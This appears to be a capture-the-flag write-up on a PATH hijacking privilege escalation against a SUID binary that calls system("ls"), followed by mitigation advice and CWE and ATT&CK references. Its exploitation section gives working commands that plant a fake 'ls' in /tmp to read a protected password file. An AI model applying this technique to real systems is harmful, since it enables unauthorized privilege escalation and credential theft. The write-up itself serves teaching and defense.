# Bash - System 1

`App - Script` • `Very Easy` • `5 pts`

## TL;DR

PATH hijacking vulnerability in SUID binary. Exploit `system("ls")` by creating malicious `ls` command in `/tmp` and prepending to PATH.

**Flag:** ✓ (validated)

---

## Challenge Description

> Find your way, young padawan!

**Context:** A SUID C binary executes `ls /challenge/app-script/ch11/.passwd` using the insecure `system()` function.

---

## Recon

**Binary analysis:**
```bash
$ file /challenge/app-script/ch11/ch11
ch11: setuid ELF 64-bit LSB executable

$ ls -la /challenge/app-script/ch11/ch11
-rwsr-x--- 1 app-script-ch11-cracked app-script-ch11 [size] ch11
```

**Vulnerable code pattern:**
```c
setreuid(geteuid(), geteuid());
system("ls /challenge/app-script/ch11/.passwd");
```

**Vulnerability identification:**
- `system()` searches for `ls` in **PATH** environment variable
- No absolute path (`/bin/ls`) specified
- SUID context allows privilege escalation

---

## Exploitation

### Attack Strategy

Create malicious `ls` executable and manipulate PATH to prioritize our version.

**Step 1: Create weaponized `ls`**
```bash
cd /tmp
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch11/.passwd
EOF
chmod +x ls
```

**Step 2: Hijack PATH**
```bash
export PATH=/tmp:$PATH
```

**Step 3: Trigger exploitation**
```bash
/challenge/app-script/ch11/ch11
```

**Result:** Binary executes our malicious `ls`, which reads the password file with elevated privileges.

---

## Impact & Mitigation

### Real-World Implications
- **CWE-426**: Untrusted Search Path
- **CWE-78**: OS Command Injection
- **MITRE ATT&CK T1574.007**: Hijack Execution Flow via PATH Environment Variable

**Attack scenarios:**
- Privilege escalation on misconfigured systems
- Lateral movement in enterprise environments
- Persistence through PATH manipulation

### Secure Coding Practices

| Vulnerable          | Secure                   |
|---------------------|--------------------------|
| `system("ls file")` | `system("/bin/ls file")` |
| Relies on PATH      | Absolute path            |
|------------------------------------------------|
|  Better: use `execve()` with full control      |

**Code remediation:**
```c
// Instead of:
system("ls /path/to/file");

// Use:
execl("/bin/ls", "ls", "/path/to/file", NULL);
// Or validate/sanitize PATH before system() calls
```

---

## Key Takeaways

**Technical Skills:**
- Exploited PATH environment variable manipulation
- Created malicious executables for privilege escalation
- Understood SUID binary behavior and privilege inheritance

**Security Concepts:**
- **PATH hijacking**: Critical vulnerability in command execution
- **Principle of least privilege**: Never trust user-controlled environment variables
- **Secure coding**: Always use absolute paths in privileged contexts

**Red Team Perspective:** Common vector in CTF and real-world pentests—check SUID binaries and misconfigured scripts.

**Blue Team Perspective:** Audit code for `system()` calls, enforce secure PATH in privileged contexts, use `execve()` family functions.
